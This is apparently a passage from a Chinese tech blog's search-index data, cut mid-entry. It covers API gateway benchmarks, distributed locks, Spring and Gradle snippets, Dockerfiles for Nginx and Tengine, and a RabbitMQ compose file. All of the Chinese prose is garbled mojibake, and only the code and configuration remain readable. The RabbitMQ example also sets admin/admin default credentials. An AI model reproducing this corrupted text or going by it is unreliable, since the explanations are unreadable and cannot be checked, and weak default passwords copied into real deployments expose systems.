Cloud Gateway ~ Zuul 2 &lt;&lt; OpenResty ~&lt; Kong &lt;&lt; Directï¼ˆç›´è¿ï¼‰ Spring Cloud Gatewayã€Zuul 2 çš„æ€§èƒ½å·®ä¸å¤šï¼Œå¤§æ¦‚æ˜¯ç›´è¿çš„ 35%-40% OpenRestyã€Kong å·®ä¸å¤šï¼Œå¤§æ¦‚æ˜¯ç›´è¿çš„ 60%-70% å€¼å¾—ä¸€æçš„æ˜¯ï¼Œåœ¨å¤§å¹¶å‘åœºæ™¯ä¸‹ï¼Œä¾‹å¦‚æ¨¡æ‹Ÿ 200 å¹¶å‘ç”¨æˆ·ã€1000 å¹¶å‘ç”¨æˆ·æ—¶ï¼ŒZuul 2 ä¼šæœ‰å¾ˆå¤§æ¦‚ç‡è¿”å›å‡ºé”™ï¼Œè¿™ä¹Ÿè¯´æ˜ Zuul 2 ç›®å‰è¿˜ä¸æˆç†Ÿã€‚Kong çš„æ€§èƒ½éå¸¸ä¸é”™ï¼Œéå¸¸é€‚åˆåšæµé‡ç½‘å…³ï¼Œå¹¶ä¸”å¯¹äº serviceã€routeã€upstreamã€consumerã€plugins çš„æŠ½è±¡ï¼Œä¹Ÿæ˜¯è‡ªç ”ç½‘å…³å€¼å¾—å€Ÿé‰´çš„ã€‚ä½†å¯¹äºå¤æ‚ç³»ç»Ÿï¼Œä¸å»ºè®®ä¸šåŠ¡ç½‘å…³ç”¨ Kongï¼Œæˆ–è€…æ›´æ˜ç¡®çš„è¯´æ˜¯ä¸å»ºè®®åœ¨ Java æŠ€æœ¯æ ˆçš„ç³»ç»Ÿæ·±åº¦å®šåˆ¶ Kong æˆ– OpenRestyï¼Œä¸»è¦æ˜¯å·¥ç¨‹æ€§æ–¹é¢çš„è€ƒè™‘ã€‚ä¸¾ä¸ªä¾‹å­ï¼šå‡å¦‚æœ‰å¾ˆå¤šä¸ªä¸åŒä¸šåŠ¡çº¿ï¼Œé‰´æƒæ–¹å¼äº”èŠ±å…«é—¨ï¼Œéƒ½æ˜¯ä¸ä¸šåŠ¡å¤šå°‘æœ‰ç‚¹ç›¸å…³çš„ï¼›è¿™æ—¶å¦‚æœæŠŠé‰´æƒåœ¨ç½‘å…³å®ç°ï¼Œå°±éœ€è¦ç»´æŠ¤å¤§é‡çš„ Lua è„šæœ¬ï¼Œå¼•å…¥ä¸€ä¸ªæ–°çš„å¤æ‚æŠ€æœ¯æ ˆæ˜¯ä¸€ä¸ªæˆæœ¬ä¸ä½çš„äº‹æƒ…ã€‚Spring Cloud Gatewayã€Zuul2 å¯¹äº Java æŠ€æœ¯æ ˆæ¥è¯´æ¯”è¾ƒæ–¹ä¾¿ï¼Œå¯ä»¥ä¾èµ–ä¸šåŠ¡ç³»ç»Ÿçš„ä¸€äº› Common ç»„ä»¶ï¼›è€Œä½¿ç”¨ Lua å¼€å‘ä¸æ–¹ä¾¿ï¼Œä¸å…‰æ˜¯è¯­è¨€çš„é—®é¢˜ï¼Œæ›´æ˜¯å¤ç”¨åŸºç¡€è®¾æ–½çš„é—®é¢˜ã€‚å¦å¤–ï¼Œå¯¹äºç½‘å…³ç³»ç»Ÿæ¥è¯´ï¼Œæ€§èƒ½ä¸æ˜¯å·®ä¸€ä¸ªæ•°é‡çº§ï¼Œé—®é¢˜ä¸æ˜¯å¾ˆå¤§ï¼Œå¤šåŠ æœºå™¨å°±å¯ä»¥æå®šã€‚ Spring Cloud Gateway ä¸ Zuul 1.x å¯¹æ¯” åº•å±‚å®ç°ï¼šZuul 1.x åŸºäº Servlet 2.5 æ„å»ºï¼Œä½¿ç”¨çš„æ˜¯é˜»å¡çš„ I/O æ¨¡å‹ã€‚Gateway æ˜¯åŸºäº Spring 5.xã€Spring Boot 2.xã€Spring WebFlux å’Œ Project Reactor ç­‰æŠ€æœ¯ï¼Œåº•å±‚ä½¿ç”¨ Netty çš„éé˜»å¡ I/O æ¨¡å‹ã€‚ é•¿è¿æ¥ï¼šGateway æ”¯æŒé•¿è¿æ¥ï¼Œè€Œ Zuul 1.x ä¸æ”¯æŒé•¿è¿æ¥ï¼ˆå¦‚ WebSocketï¼‰ï¼Œä¸é€‚ç”¨åç«¯æœåŠ¡å“åº”æ…¢æˆ–è€…é«˜å¹¶å‘åœºæ™¯ä¸‹ï¼Œå› ä¸ºçº¿ç¨‹æ•°é‡æ˜¯å›ºå®šï¼ˆæœ‰é™ï¼‰çš„ï¼Œçº¿ç¨‹å®¹æ˜“è¢«è€—å°½ï¼Œå¯¼è‡´æ–°è¯·æ±‚è¢«æ‹’ç»å¤„ç†ã€‚ é™æµï¼šZuul 1.x éœ€è¦é€šè¿‡ Filter å®ç°é™æµæ‰©å±•ï¼ŒGateway å†…ç½®äº†é™æµè¿‡æ»¤å™¨ã€‚ æ€§èƒ½ï¼šæ ¹æ®å®˜æ–¹æä¾›çš„åŸºå‡†æµ‹è¯•ï¼ŒSpring Cloud Gateway çš„ RPSï¼ˆæ¯ç§’è¯·æ±‚æ•°ï¼‰æ˜¯ Zuul 1.x çš„ 1.6 å€ï¼Œå¹³å‡å»¶è¿Ÿæ˜¯ Zuul 1.x çš„ä¸€åŠã€‚ æŠ€æœ¯æ ˆæ²‰æ·€ï¼šZuul 1.x å¼€æºè¿‘ä¸ƒå¹´ï¼Œç»å—è€ƒéªŒï¼Œç¨³å®šæˆç†Ÿï¼ŒGateway æœªè§å®é™…è½åœ°æ¡ˆä¾‹ï¼ŒGithub ç»Ÿè®¡å¦‚ä¸‹ï¼š ä»“åº“æ•°é‡ issues æ•°é‡ è¯´æ˜ Zuul1.x 1007 repositories Zuul1.x 88 Open / 2736 Closed ç»Ÿè®¡æ—¶é—´æˆªæ­¢ 2019/8/26 Gateway 102 repositories Gateway 135 Open / 850 Closed ç»Ÿè®¡æ—¶é—´æˆªæ­¢ 2019/8/26 æ‚é¡¹åˆ†å¸ƒå¼é”çš„å®ç°æ–¹æ¡ˆ Redissonï¼šRedis å®˜æ–¹çš„åˆ†å¸ƒå¼é”å®ç° Zookeeperï¼šåˆ©ç”¨ Zookeeper çš„é¡ºåºä¸´æ—¶èŠ‚ç‚¹ï¼Œæ¥å®ç°åˆ†å¸ƒå¼é”å’Œç­‰å¾…é˜Ÿåˆ— Chubbyï¼šGoogle å…¬å¸å®ç°çš„ç²—ç²’åº¦åˆ†å¸ƒå¼é”æœåŠ¡ï¼Œåº•å±‚åˆ©ç”¨äº† Paxos ä¸€è‡´æ€§ç®—æ³• Redisï¼šå’Œ Memcached çš„æ–¹å¼ç±»ä¼¼ï¼Œåˆ©ç”¨ Redis çš„ setnx å‘½ä»¤ï¼Œæ­¤å‘½ä»¤åŒæ ·æ˜¯åŸå­æ€§æ“ä½œï¼Œåªæœ‰åœ¨ key ä¸å­˜åœ¨çš„æƒ…å†µä¸‹æ‰èƒ½ set æˆåŠŸ Memcachedï¼šåˆ©ç”¨ Memcached çš„ add å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ˜¯åŸå­æ€§æ“ä½œï¼Œåªæœ‰åœ¨ key ä¸å­˜åœ¨çš„æƒ…å†µä¸‹æ‰èƒ½ add æˆåŠŸï¼Œä¹Ÿå°±æ„å‘³ç€çº¿ç¨‹å¾—åˆ°äº†é” Nginx åŠ¨æ€æ›´æ–° upstream çš„æ–¹æ¡ˆåœ¨ä¸ä½¿ç”¨æœåŠ¡å‘ç°ä¸­é—´ä»¶ï¼ˆå¦‚ Zookeeperã€Eurekaã€Consulï¼‰çš„åœºæ™¯ä¸‹ï¼Œä½¿ç”¨ä¼ ç»Ÿçš„åŸºäºä»£ç†çš„è´Ÿè½½å‡è¡¡è§£å†³æ–¹æ¡ˆï¼ˆå¦‚ Nginxï¼‰ï¼Œæ­¤æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨ä»¥ä¸‹æ–¹æ¡ˆåŠ¨æ€æ›´æ–°æœåŠ¡æä¾›è€…åˆ—è¡¨ã€‚ æ‰‹å·¥æˆ–è€…é€šè¿‡è„šæœ¬æ–¹å¼ï¼Œåœ¨éƒ¨ç½²çš„æ—¶å€™å»æ›´æ–° Nginx çš„é…ç½®æ–‡ä»¶ï¼Œç„¶å reload ä½¿ç”¨ ngx_http_dyups_module æ¨¡å—ï¼Œé€šè¿‡ REST API æ¥åœ¨è¿è¡Œæ—¶ç›´æ¥æ›´æ–° upstream è€Œä¸éœ€è¦ reload consul-template + Nginx çš„æ–¹æ¡ˆä¸€ï¼Œé€šè¿‡ consul ç›‘å¬æœåŠ¡å®ä¾‹çš„å˜åŒ–ï¼Œç„¶åæ›´æ–° Nginx çš„é…ç½®æ–‡ä»¶ï¼Œé€šè¿‡ reload å®ç°æœåŠ¡åˆ—è¡¨çš„æ›´æ–° consul-template + Nginx çš„æ–¹æ¡ˆäºŒï¼ŒNginx åœ¨è¿è¡Œæ—¶é€šè¿‡ consul è·å–æœåŠ¡åˆ—è¡¨æ¥å®ç°åŠ¨æ€ upstream çš„è·¯ç”± OpenResty + Lua çš„æ–¹æ¡ˆï¼Œé€šè¿‡ Lua è„šæœ¬å®ç°åŠ¨æ€ upstream çš„è·¯ç”± var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ æ¶æ„"},{title:"Spring å¼€å‘éšç¬”",url:"/posts/19b24d.html",text:'@RequestRequestBody æ³¨è§£æŠ›å‡ºå¼‚å¸¸ä¿¡æ¯ â€œRequired request body is missingâ€ é‡‡ç”¨ SSM æ¡†æ¶ï¼Œå‰ç«¯å°†å‚æ•°ä¼ é€’ç»™åç«¯ï¼ŒSpringMVC å¯ä»¥é€šè¿‡æ³¨è§£ @RequestBody å°†ä¼ é€’å‚æ•°ç»‘å®šåœ¨ Controller çš„æ–¹æ³•å‚æ•°ä¸­ã€‚æ­¤æ—¶å¿…é¡»æ³¨æ„ï¼Œå½“è¯·æ±‚æ–¹æ³•å£°æ˜ä¸º GET å’Œ DELETE çš„æ—¶å€™ï¼ŒHTTP è¯·æ±‚è§„èŒƒé‡Œè§„å®šæ˜¯ä¸ä¼šæœ‰ RequestBody çš„ï¼Œåªæœ‰è¯·æ±‚æ–¹æ³•å£°æ˜ä¸º POST å’Œ PUT çš„æ—¶å€™æ‰æœ‰ï¼Œå› æ­¤ @RequestBody ä¸é€‚ç”¨äº GET ä¸ DELETE æ–¹æ³•ã€‚è¿˜æœ‰å¦‚æœè¯·æ±‚æ–¹æ³•å£°æ˜ä¸º GETã€DELETEï¼Œé‚£ä¹ˆ SpringMVC å¯ä»¥ç›´æ¥å°†ä¼ é€’å‚æ•°ç»‘å®šåœ¨æ–¹æ³•çš„å‚æ•°ä¸­ï¼Œå¦‚æœè¯·æ±‚æ–¹æ³•å£°æ˜ä¸º POSTã€PUTï¼Œåˆ™å¿…é¡»ä½¿ç”¨æ³¨è§£ @RequestBody ä¿®é¥° Controller ä¸­çš„æ–¹æ³•å‚æ•°ï¼Œå¦åˆ™æ— æ³•è·å–å‰ç«¯ä¼ é€’è¿‡æ¥çš„å‚æ•°å€¼ã€‚æ­£ç¡®çš„ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738@Controller@RequestMapping("/user/api")public class UserApiController { @Autowired private UserApiService userApiService; @ResponseBody @RequestMapping(value = "/get/{id}", method = RequestMethod.GET) public RequestResult&lt;UserApiVo&gt; getById(@PathVariable("id") int id) { return userApiService.get(id); } @ResponseBody @RequestMapping(value = "/query", method = RequestMethod.GET) public RequestResult&lt;Page&gt; query(Page page) { return userApiService.query(page); } @ResponseBody @RequestMapping(value = "/add", method = RequestMethod.POST) public RequestResult add(@RequestBody @Valid UserApiVo vo) { return userApiService.add(vo); } @ResponseBody @RequestMapping(value = ("/update"), method = RequestMethod.POST) public RequestResult update(@RequestBody @Valid UserApiVo vo) { return userApiService.update(vo); } @ResponseBody @RequestMapping(value = "/delete/{id}", method = RequestMethod.DELETE) public RequestResult delete(@PathVariable("id") int id) { return userApiService.delete(id); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java å¼€å‘éšç¬”"},{title:"Gradle åŸºç¡€ä½¿ç”¨æ•™ç¨‹",url:"/posts/2148b5a7.html",text:'ç›¸å…³ç«™ç‚¹ Gradle Plugin å®˜ç½‘ Gradle çŸ¥è¯†ç‚¹ æ„å»ºè„šæœ¬çš„ç¼–å†™ åˆ›å»ºè‡ªå®šä¹‰æ„å»ºä»»åŠ¡ åˆ›å»ºè‡ªå®šä¹‰æ’ä»¶ æ„å»ºç”Ÿå‘½å‘¨æœŸ ä¾èµ–ç®¡ç† ç‰ˆæœ¬å†²çªè§£å†³ å¤šé¡¹ç›®æ„å»º è‡ªåŠ¨åŒ–æµ‹è¯• é¡¹ç›®æ‰“åŒ…å‘å¸ƒ Gradle å­æ¨¡å—ä¾èµ–çˆ¶æ¨¡å—ä¸­çš„èµ„æºæ–‡ä»¶ 12345678910111213141516// æ–¹æ³•ä¸€ï¼Œåœ¨å­æ¨¡å—çš„build.gradleä¸­ï¼ŒæŒ‡å®šçˆ¶æ¨¡å—çš„èµ„æºæ–‡ä»¶sourceSets { main { resources { // æŒ‡å®šèµ„æºæ–‡ä»¶ç›®å½•ï¼Œè‹¥å­˜åœ¨åŒåèµ„æºæ–‡ä»¶ï¼Œå·¦è¾¹å£°æ˜çš„é»˜è®¤ä¼šè¢«å³è¾¹å£°æ˜çš„æ‰€è¦†ç›– srcDirs = [\'src/main/resources\', \'../common/build/resources/main\'] } }}// æ–¹æ³•äºŒï¼Œåœ¨å­æ¨¡å—çš„build.gradleä¸­ï¼ŒæŒ‡å®šçˆ¶æ¨¡å—çš„èµ„æºæ–‡ä»¶processResources { // æŒ‡å®šèµ„æºæ–‡ä»¶ç›®å½•ï¼Œè‹¥å­˜åœ¨åŒåèµ„æºæ–‡ä»¶ï¼Œå…ˆå£°æ˜çš„é»˜è®¤ä¼šè¢«åå£°æ˜çš„æ‰€è¦†ç›– from(\'src/main/resources\') from(\'../common/build/resources/main\')} Gradle ç¼–è¯‘æ—¶ï¼Œå­æ¨¡å—ä¾èµ–çˆ¶æ¨¡å—çš„ Jar åŒ…ç±» 1234// åœ¨çˆ¶æ¨¡å—çš„build.gradleä¸­ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹jar { enabled = true} Gradle æ‰“æˆ Jar åŒ…ååŒ…å«æ‰€æœ‰ä¾èµ– 123456789jar { manifest { attributes( "Manifest-Version": 1.0, "Main-Class": "com.zhiduoduo.proxy.ProxyApplication" ) } from { configurations.compile.collect { it.isDirectory() ? it : zipTree(it) } }} Gradle ä¸­çš„ apply plugin ä¸ plugins çš„åŒºåˆ« 12345678910111213141516// Gradle æ–°ç‰ˆæœ¬çš„å†™æ³•å¦‚ä¸‹ï¼šplugins { id \'org.springframework.boot\' version \'2.1.0.RELEASE\'}// Gradle 2.0åŠæ›´æ—§ç‰ˆæœ¬çš„å†™æ³•å¦‚ä¸‹ï¼šbuildscript { repositories { mavenCentral() } dependencies { classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}") }}apply plugin: \'org.springframework.boot\' Gradle æ·»åŠ  lombok ä¾èµ– 123456dependencies { compileOnly \'org.projectlombok:lombok:1.18.6\' testCompileOnly \'org.projectlombok:lombok:1.18.6\' annotationProcessor \'org.projectlombok:lombok:1.18.6\' testAnnotationProcessor \'org.projectlombok:lombok:1.18.6\'} Gradle ç¼–è¯‘æ—¶å–æ¶ˆæ‰€æœ‰æµ‹è¯• 123test { exclude \'**/*\'} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"ç¼–ç¨‹è¯­è¨€åˆ†ç±»",url:"/posts/dbbdce78.html",text:'ç¼–ç¨‹å››å¤§åŸºç¡€ æ•°æ®ç»“æ„ä¸ç®—æ³•ã€è®¡ç®—æœºç½‘ç»œã€æ“ä½œç³»ç»Ÿã€è®¾è®¡æ¨¡å¼ åº•å±‚å¼€å‘ æ±‡ç¼–ã€Cã€C++ Web å¼€å‘ Javaã€PHPã€Pythonã€Goã€Ruby å¤§æ•°æ® Javaã€Scala åŒºå—é“¾ Go äººå·¥æ™ºèƒ½ Python æ•°æ®åˆ†æã€æ•°æ®æŒ–æ˜ã€çˆ¬è™« Python Android å¼€å‘ Javaã€Kotlinã€Groovy IOS å¼€å‘ Objective-Cã€Swift å…¶ä»–å¼€å‘ Perlã€Luaã€Shell var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘éšç¬”"},{title:"ç¼–å†™ DockerFile æ„å»º Nginx ä¸ Tengine é•œåƒ",url:"/posts/e34a05cd.html",text:'Nginx é•œåƒçš„ DockerFile 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# å®‰è£…è½¯ä»¶RUN yum -y update &amp;&amp; yum -y install gcc gdb strace gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses ncurses-devel curl curl-devel e2fsprogs patch e2fsprogs-devel krb5-devel libidn libidn-devel openldap-devel nss_ldap openldap-clients openldap-servers libevent-devel libevent uuid-devel uuid openssl openssl-devel pcre pcre-devel# åˆ›å»ºç”¨æˆ·RUN groupadd wwwRUN useradd -g www www -s /bin/false# å®šä¹‰Nginxç‰ˆæœ¬å·ENV VERSION 1.14.2# ä¸‹è½½å¹¶è§£å‹æ–‡ä»¶RUN mkdir -p /usr/local/src/ADD http://nginx.org/download/nginx-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/nginx-$VERSION.tar.gz -C /usr/local/src/# åˆ›å»ºå®‰è£…ç›®å½•ENV NGINX_HOME /usr/local/nginxRUN mkdir -p $NGINX_HOMERUN chown -R www:www $NGINX_HOME# è¿›å…¥è§£å‹ç›®å½•WORKDIR /usr/local/src/nginx-$VERSION# ç¼–è¯‘å®‰è£…RUN ./configure \\ --user=www \\ --group=www \\ --prefix=$NGINX_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_moduleRUN makeRUN make install# å¤‡ä»½Nginxçš„é…ç½®æ–‡ä»¶RUN mv $NGINX_HOME/conf/nginx.conf $NGINX_HOME/conf/nginx.conf.default# è®¾ç½®ç¯å¢ƒå˜é‡ENV PATH $PATH:$NGINX_HOME/sbin# åˆ›å»ºWebAppç›®å½•ENV WEB_APP /usr/share/nginx/htmlRUN mkdir -p $WEB_APP# è®¾ç½®é»˜è®¤å·¥ä½œç›®å½•WORKDIR $WEB_APP# æš´éœ²ç«¯å£EXPOSE 80EXPOSE 443# æ¸…ç†å‹ç¼©åŒ…ä¸è§£å‹æ–‡ä»¶RUN rm -rf /usr/local/src/nginx*CMD $NGINX_HOME/sbin/nginx -g \'daemon off;\' -c $NGINX_HOME/conf/nginx.conf æ„å»º Nginx é•œåƒ 12# æ„å»ºNginxé•œåƒ# docker build -f docker-file -t peter/nginx:1.14.2 . Docker-Compose ç®¡ç† Nginx é•œåƒ 1234567891011121314151617version: "3.5"services: nginx: image: peter/nginx:1.14.2 container_name: nginx-1.14.2 privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/nginx/wwwroot:/usr/share/nginx/html\' - \'/container/nginx/logs:/usr/local/nginx/logs\' - \'/container/nginx/nginx.conf:/usr/local/nginx/conf/nginx.conf\'# ä¸Šé¢çš„é…ç½®æ˜¯docker-compose.ymlæ–‡ä»¶çš„å†…å®¹ï¼Œæ•°æ®å·éƒ¨åˆ†å¯ä»¥æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹# æ³¨æ„ï¼š åœ¨/container/nginx/nginx.confé…ç½®æ–‡ä»¶ä¸­ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹rootçš„è·¯å¾„ä¸º/usr/share/nginx/html åˆ›å»ºå¹¶å¯åŠ¨ Nginx å®¹å™¨ 12345# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker-compose up -d# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker-compose ps Tengine é•œåƒçš„ DockerFile 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061FROM centos:7MAINTAINER peter&lt;peter@gmail.com&gt;# å®‰è£…è½¯ä»¶RUN yum -y update &amp;&amp; yum -y install vim tree htop tmux net-tools telnet wget curl supervistor autoconf git gcc gcc-c++ pcre pcre-devel zlib zlib-devel openssl openssl-devel# åˆ›å»ºç”¨æˆ·RUN groupadd tengineRUN useradd -g tengine tengine# å®šä¹‰Tengineç‰ˆæœ¬å·ENV VERSION 2.2.3# ä¸‹è½½å¹¶è§£å‹æ–‡ä»¶RUN mkdir -p /usr/local/src/ADD http://tengine.taobao.org/download/tengine-$VERSION.tar.gz /usr/local/srcRUN tar -xvf /usr/local/src/tengine-$VERSION.tar.gz -C /usr/local/src/# åˆ›å»ºå®‰è£…ç›®å½•ENV TENGINE_HOME /usr/local/tengineRUN mkdir -p $TENGINE_HOME# è¿›å…¥è§£å‹ç›®å½•WORKDIR /usr/local/src/tengine-$VERSION# ç¼–è¯‘å®‰è£…RUN ./configure \\ --user=tengine \\ --group=tengine \\ --prefix=$TENGINE_HOME \\ --with-http_ssl_module \\ --with-http_realip_module \\ --with-http_concat_module \\ --with-http_gzip_static_module \\ --with-http_stub_status_module \\ --with-http_upstream_consistent_hash_moduleRUN makeRUN make install# å¤‡ä»½Tengineçš„é…ç½®æ–‡ä»¶RUN mv $TENGINE_HOME/conf/nginx.conf $TENGINE_HOME/conf/nginx.conf.default# è®¾ç½®ç¯å¢ƒå˜é‡ENV PATH $PATH:$TENGINE_HOME/sbin# åˆ›å»ºWebAppç›®å½•ENV WEB_APP /usr/share/tengine/htmlRUN mkdir -p $WEB_APP# è®¾ç½®é»˜è®¤å·¥ä½œç›®å½•WORKDIR $WEB_APP# æš´éœ²ç«¯å£EXPOSE 80EXPOSE 443# æ¸…ç†å‹ç¼©åŒ…ä¸è§£å‹æ–‡ä»¶RUN rm -rf /usr/local/src/tengine*CMD $TENGINE_HOME/sbin/nginx -g \'daemon off;\' -c $TENGINE_HOME/conf/nginx.conf æ„å»º Tengine é•œåƒ 12# æ„å»ºTengineé•œåƒ# docker build -f docker-file -t peter/tengine:2.2.3 . Docker-Compose ç®¡ç† Tengine é•œåƒ 123456789101112131415161718version: "3.5"services: tengine: image: peter/tengine:2.2.3 container_name: tengine:2.2.3 restart: always privileged: false ports: - 80:80 - 443:443 volumes: - \'/container/tengine/wwwroot/:/usr/share/tengine/html\' - \'/container/tengine/logs:/usr/local/tengine/logs\' - \'/container/tengine/nginx.conf:/usr/local/tengine/conf/nginx.conf\'# ä¸Šé¢çš„é…ç½®æ˜¯docker-compose.ymlæ–‡ä»¶çš„å†…å®¹ï¼Œæ•°æ®å·éƒ¨åˆ†å¯ä»¥æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µè¿›è¡Œä¿®æ”¹# æ³¨æ„ï¼š åœ¨/container/tengine/nginx.confé…ç½®æ–‡ä»¶ä¸­éœ€è¦æ‰‹åŠ¨ä¿®æ”¹rootçš„è·¯å¾„ä¸º/usr/share/tengine/html åˆ›å»ºå¹¶å¯åŠ¨ Tengine å®¹å™¨ 12345# åˆ›å»ºå¹¶å¯åŠ¨å®¹å™¨# docker-compose up -d# æŸ¥çœ‹å®¹å™¨çš„è¿è¡ŒçŠ¶æ€# docker-compose ps var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ– webæœåŠ¡å™¨"},{title:"Docker å®‰è£… RabbitMQ",url:"/posts/c6982fb6.html",text:'Docker-Compose å•æœºå®‰è£… RabbitMQ RabbitMQ çš„æ•°æ®åº“åç§°è§„åˆ™æ˜¯ NODENAME@hostnameï¼Œç”±äº Docker æ¯æ¬¡ä» Docker Image å¯åŠ¨å®¹å™¨çš„æ—¶å€™ä¼šè‡ªåŠ¨ç”Ÿæˆ hostnameï¼Œè¿™æ ·ä¸€æ¥ä¹‹å‰ä¿å­˜åœ¨ä¸»æœºä¸Šçš„æ•°æ®åº“å°±ä¼šæ²¡ç”¨äº†ï¼ŒåŒ…æ‹¬ä¹‹å‰åˆ›å»ºçš„ç”¨æˆ·ä¹Ÿä¼šæ²¡æœ‰äº†ã€‚æ‰€ä»¥åœ¨åˆ›å»ºå®¹å™¨çš„æ—¶å€™å¿…é¡»æŒ‡å®š --hostname=rabbitmqï¼Œè¿™æ · Docker ç¯å¢ƒå¯åŠ¨å RabbitMQ å°±ä¼šä¸€ç›´è¯»å–å›ºå®šç›®å½•ä¸­çš„æ•°æ®äº†ã€‚docker-compose.yml çš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œå…¶ä¸­ RABBITMQ_DEFAULT_USER ä¸ºç”¨æˆ·åï¼ŒRABBITMQ_DEFAULT_PASS ä¸ºç”¨æˆ·å¯†ç ï¼Œ5672 ä¸º RabbitMQ çš„æœåŠ¡ç«¯å£ï¼Œ15672 ä¸º RabbitMQ çš„ Web æ§åˆ¶å°çš„ç«¯å£ã€‚RabbitMQ çš„ Web æ§åˆ¶å°é»˜è®¤æ˜¯æœªå¯ç”¨çš„ï¼Œè‹¥éœ€å¯ç”¨ Web æ§åˆ¶å°çš„åŠŸèƒ½ï¼Œå¯ä»¥æŒ‚è½½å¯¹åº”çš„é…ç½®æ–‡ä»¶åˆ°å®¹å™¨å†…çš„ /etc/rabbitmq/enabled_pluginsï¼Œè€Œé…ç½®æ–‡ä»¶çš„å†…å®¹ä¸º RabbitMQ å¯ç”¨çš„æ’ä»¶åˆ—è¡¨ã€‚ 123456789101112131415161718192021222324rabbitmq: image: rabbitmq:3.8.14 container_name: rabbitmq-3.8.14 hostname: rabbitmq privileged: false networks: rabbitmq-network: ipv4_address: 172.175.0.5 environment: - RABBITMQ_DEFAULT_USER=admin - RABBITMQ_DEFAULT_PASS=admin ports: - 5672:5672 - 15672:15672 volumes: - \'/container/mahattan/rabbitmq/enabled_plugins:/etc/rabbitmq/enabled_plugins\'networks: rabbitmq-network: name: rabbitmq-network driver: bridge ipam: config: - subnet: 172.175.0.0/24 ä¸Šè¿°æŒ‚è½½çš„ /container/mahattan/rabbitmq/enabled_plugins çš„é…ç½®æ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š 1[rabbitmq_federation_management,rabbitmq_management,rabbitmq_mqtt,rabbitmq_stomp]. RabbitMQ 